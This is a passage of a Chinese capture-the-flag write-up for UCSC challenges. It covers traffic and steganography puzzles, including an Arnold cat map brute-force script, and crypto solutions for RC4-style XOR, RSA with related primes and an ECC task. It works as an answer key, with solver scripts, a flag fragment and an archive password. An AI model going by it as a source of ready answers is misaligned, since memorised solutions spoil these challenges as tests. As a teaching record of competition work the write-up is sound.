loading=\"lazy\"></p>\n<p>part3:5d0cb5695077</p>\n<p>压缩包密码thinkbell</p>\n<p><img src=\"/images/1745240699575-23.png\" alt=\"img\" loading=\"lazy\"></p>\n<h3 id=\"No-shArk-ucsc\"><a href=\"#No-shArk-ucsc\" class=\"headerlink\" title=\"No.shArk-ucsc\"></a>No.shArk-ucsc</h3><p><img src=\"/images/1745240699575-24.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>流量中存在0101数据，转成二维码，修复完二维码扫描得到一个字符串”Y0U_Fi8d_ItHa@aaHH”。</p>\n<p><img src=\"/images/1745240699575-25.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699575-26.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>流量中提取出三个文件和一个存在SNOW数据的html。</p>\n<p>发现有SNOW隐写提示，使用SNOW解密出后半部分flag。</p>\n<p><img src=\"/images/1745240699575-27.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699575-28.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699576-29.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>结合提示，猜测另一个png图是要用Arnold Cat map变化来爆破出正确flag图。</p>\n<p>百度找到的脚本直接可用（<a href=\"https://www.cnblogs.com/alexander17/p/18551089%EF%BC%89%E3%80%82\">https://www.cnblogs.com/alexander17/p/18551089）。</a></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> matplotlib<span class=\"token punctuation\">.</span>pyplot <span class=\"token keyword\">as</span> plt\n<span class=\"token keyword\">import</span> cv2\n<span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">arnold_decode</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span> shuffle_times<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\" decode for rgb image that encoded by Arnold\n    Args:\n        image: rgb image encoded by Arnold\n        shuffle_times: how many times to shuffle\n    Returns:\n        decode image\n    \"\"\"</span>\n    <span class=\"token comment\"># 1:创建新图像</span>\n    decode_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>zeros<span class=\"token punctuation\">(</span>shape<span class=\"token operator\">=</span>image<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 2：计算N</span>\n    h<span class=\"token punctuation\">,</span> w <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> image<span class=\"token punctuation\">.</span>shape<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    N <span class=\"token operator\">=</span> h  <span class=\"token comment\"># 或N=w</span>\n\n    <span class=\"token comment\"># 3：遍历像素坐标变换</span>\n    <span class=\"token keyword\">for</span> time <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>shuffle_times<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> ori_x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> ori_y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token comment\"># 按照公式坐标变换</span>\n                new_x <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">*</span> b <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> ori_x <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> ori_y<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> N\n                new_y <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> ori_x <span class=\"token operator\">+</span> ori_y<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> N\n                decode_image<span class=\"token punctuation\">[</span>new_x<span class=\"token punctuation\">,</span> new_y<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> image<span class=\"token punctuation\">[</span>ori_x<span class=\"token punctuation\">,</span> ori_y<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n        image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span>decode_image<span class=\"token punctuation\">)</span>\n        \n    <span class=\"token keyword\">return</span> image\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">arnold_brute</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span>shuffle_times_range<span class=\"token punctuation\">,</span>a_range<span class=\"token punctuation\">,</span>b_range<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>shuffle_times_range<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>shuffle_times_range<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>a_range<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>a_range<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> b <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>b_range<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>b_range<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"[+] Trying shuffle_times=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> a=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>a<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> b=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                decoded_img <span class=\"token operator\">=</span> arnold_decode<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\n                output_filename <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"flag_decodedc</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">_a</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>a<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">_b</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>b<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png\"</span></span>\n                cv2<span class=\"token punctuation\">.</span>imwrite<span class=\"token punctuation\">(</span>output_filename<span class=\"token punctuation\">,</span> decoded_img<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>cv2<span class=\"token punctuation\">.</span>IMWRITE_PNG_COMPRESSION<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n                \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>imread<span class=\"token punctuation\">(</span><span class=\"token string\">\"cat.png\"</span><span class=\"token punctuation\">)</span>\n    arnold_brute<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><img src=\"/images/1745240699576-30.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1745240699576-31.png\" alt=\"img\" loading=\"lazy\"></p>\n","excerpt":"","more":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>\n<p><img src=\"/images/7918DA86D3B117713C82E1F48AA03B79-1745240699577-65.png\" alt=\"7918DA86D3B117713C82E1F48AA03B79\"></p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h3 id=\"XR4-ucsc\"><a href=\"#XR4-ucsc\" class=\"headerlink\" title=\"XR4-ucsc\"></a><strong>XR4-ucsc</strong></h3><p>已知密钥，修改random_num逻辑异或回去即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> random\n<span class=\"token comment\"># from secret import flag</span>\n<span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np\n<span class=\"token keyword\">def</span> <span class=\"token function\">init_sbox</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    s_box <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> s_box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        s_box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s_box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s_box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s_box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> s_box\n<span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    res <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    i <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    cipher_bytes <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> cipher_bytes<span class=\"token punctuation\">:</span>\n        i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n        t <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        k <span class=\"token operator\">=</span> box<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">]</span>\n        res<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>s <span class=\"token operator\">^</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">random_num</span><span class=\"token punctuation\">(</span>seed_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>seed_num<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>transposed_matrix<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    transposed_matrix<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span><span class=\"token number\">111</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">95</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">45</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">39</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">84</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">116</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">19</span> <span class=\"token punctuation\">,</span><span class=\"token number\">113</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">60</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">91</span> <span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">33</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">98</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">38</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">57</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">68</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">52</span> <span class=\"token punctuation\">,</span><span class=\"token number\">119</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">56</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">43</span> <span class=\"token punctuation\">,</span><span class=\"token number\">125</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">32</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">7</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">41</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n        \n    ciphertext <span class=\"token operator\">=</span> <span class=\"token string\">\"MjM184anvdA=\"</span>\n    key <span class=\"token operator\">=</span> <span class=\"token string\">\"XR4\"</span>\n    box <span class=\"token operator\">=</span> init_sbox<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span>\n    a<span class=\"token operator\">=</span>decrypt<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    random_num<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"essential-ucsc\"><a href=\"#essential-ucsc\" class=\"headerlink\" title=\"essential-ucsc\"></a><strong>essential-ucsc</strong></h3><pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">from Crypto.Util.number import *\nimport sympy\nfrom flag import flag\n\na&#x3D;getPrime(512)\np&#x3D;sympy.nextprime(13*a)\nq&#x3D;sympy.prevprime(25*a)\nnumber2&#x3D;p*q\n\ndef crypto01(number1, number2, number3):\n    number4 &#x3D; 1\n    while number2 &gt; 0:\n        if number2 % 2: \n            number4 &#x3D; (number4 * number1) % number3\n        number1 &#x3D; number1 ** 2 % number3\n        number2 &#x2F;&#x2F;&#x3D; 2\n    return number4\n\ndef crypto02(number1, number2):\n    number3 &#x3D; number1\n    number4 &#x3D; number2\n    giao &#x3D; 1\n    giaogiao &#x3D; 0\n    while number4 &gt; 0:\n        number7 &#x3D; number3 &#x2F;&#x2F; number4\n        giao, giaogiao &#x3D; giaogiao, giao - giaogiao*number7\n        number3, number4 &#x3D; number4, number3 - number4*number7\n    while giao&lt;0:\n        giao &#x3D; giao + number2\n    return giao\n\ndef crypto03(number1, number2, number3):\n    number4 &#x3D; crypto01(number3, number1, number2)\n    return number4\n\ndef crypto05(number1,number2):\n    return pow(number1,0xe18e,number2)\n\nnumber3 &#x3D; int.from_bytes(flag[0:19].encode(&quot;utf-8&quot;), &quot;big&quot;)\nnumber4 &#x3D; int.from_bytes(flag[19:39].encode(&quot;utf-8&quot;), &quot;big&quot;)\n\nprint(crypto03(number1, number2, number3))\nprint(crypto05(number4,number2))</code></pre>\n\n<p>简单看出给出的值为 n3^n1 %n2 和 n4 ^ 0xe18e % n2 </p>\n<p>前一个因为p，q的值与a相关，除以因子后开方得到近似值，第二部分因为flag长度较小，直接开方得到flag</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nnumber1 <span class=\"token operator\">=</span> <span class=\"token number\">6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span>\nnumber2 <span class=\"token operator\">=</span> <span class=\"token number\">20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span>\n\n<span class=\"token comment\"># n3^n1 %n2</span>\nc1<span class=\"token operator\">=</span><span class=\"token number\">6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076</span>\n<span class=\"token comment\"># n4 ^ 0xe18e % n2</span>\nc2<span class=\"token operator\">=</span><span class=\"token number\">204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766</span>\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\na<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>number2<span class=\"token operator\">//</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token operator\">*</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\np<span class=\"token operator\">=</span>sympy<span class=\"token punctuation\">.</span>nextprime<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>number2<span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span>\nq<span class=\"token operator\">=</span>number2<span class=\"token operator\">//</span>p\n\nphi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nd1<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>number1<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span><span class=\"token number\">0xe18e</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nd2<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span><span class=\"token number\">0xe18e</span><span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>\nm2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>d2<span class=\"token punctuation\">,</span>number2<span class=\"token punctuation\">)</span>\n\nf2<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nf1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d1<span class=\"token punctuation\">,</span>number2<span class=\"token punctuation\">)</span>\nflag<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span>f1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>long_to_bytes<span class=\"token punctuation\">(</span>f2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"MERGE-ECC–ucsc\"><a href=\"#MERGE-ECC–ucsc\" class=\"headerlink\" title=\"MERGE_ECC–ucsc\"></a><strong>MERGE_ECC–ucsc</strong></h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> nextprime\n<span class=\"token keyword\">def</span> <span class=\"token function\">part1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> random_prime<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">513</span><span class=\"token punctuation\">)</span>\n    a <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    b <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> a<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">27</span> <span class=\"token operator\">*</span> b<span class=\"token operator\">**</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> p <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        a <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        b <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    E <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n    P<span class=\"token operator\">=</span>E<span class=\"token punctuation\">.</span>random_point<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    n <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span 